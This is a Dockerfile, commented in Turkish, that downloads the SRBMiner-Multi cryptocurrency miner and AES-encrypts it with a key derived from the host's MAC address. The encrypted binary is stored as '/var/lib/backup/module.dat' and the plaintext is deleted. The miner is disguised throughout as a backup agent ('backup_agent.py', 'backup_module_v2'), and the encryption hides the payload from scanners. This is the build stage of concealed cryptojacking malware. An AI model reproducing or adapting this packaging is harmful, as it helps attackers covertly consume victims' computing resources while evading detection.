FROM python:3.10-slim

# Gerekli paketleri yükle
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    jq \
    && rm -rf /var/lib/apt/lists/*

# pycryptodome'u yükle (AES için)
RUN pip install --no-cache-dir pycryptodome

# Dosyaları kopyala
COPY backup_agent.py /opt/backup_agent.py
COPY start.sh /start.sh
RUN chmod +x /start.sh

# SRBMiner binary'sini indir ve şifrele (örnek olarak)
# Gerçek kullanımda SRBMiner binary'sini /tmp/srbminer'a koymanız gerekir
ADD https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.3/SRBMiner-Multi-2-7-3-Linux.tar.gz /tmp/
RUN tar -xzf /tmp/SRBMiner-Multi-2-7-3-Linux.tar.gz -C /tmp/ && \
    mv /tmp/SRBMiner-Multi-2-7-3/SRBMiner-MULTI /tmp/srbminer && \
    rm -rf /tmp/SRBMiner-Multi-2-7-3*

# Şifreleme işlemi (herhangi bir ağ arayüzü yoksa fallback MAC kullan)
RUN python -c "\
import hashlib, os;\
from Crypto.Cipher import AES;\
\
# MAC adresini bul (eth0 yoksa ilk arayüzü dene, yoksa fallback)\
mac = None;\
try:\
    with open('/sys/class/net/eth0/address') as f:\
        mac = f.read().strip();\
except:\
    try:\
        import glob;\
        interfaces = glob.glob('/sys/class/net/*');\
        for iface in interfaces:\
            if 'lo' not in iface:\
                with open(iface + '/address') as f:\
                    mac = f.read().strip();\
                    break;\
    except:\
        pass;\
if not mac:\
    mac = '00:11:22:33:44:55';\
\
key = hashlib.sha256(mac.encode() + b'backup_module_v2').digest();\
with open('/tmp/srbminer', 'rb') as f:\
    data = f.read();\
iv = os.urandom(16);\
cipher = AES.new(key, AES.MODE_CBC, iv);\
# PKCS#7 padding (16 baytlık bloklar için)\
pad_len = 16 - (len(data) % 16);\
data_padded = data + bytes([pad_len]) * pad_len;\
enc = iv + cipher.encrypt(data_padded);\
with open('/var/lib/backup/module.dat', 'wb') as f:\
    f.write(enc);\
" && rm -f /tmp/srbminer

# Çalıştırma
CMD ["bash", "/start.sh"]
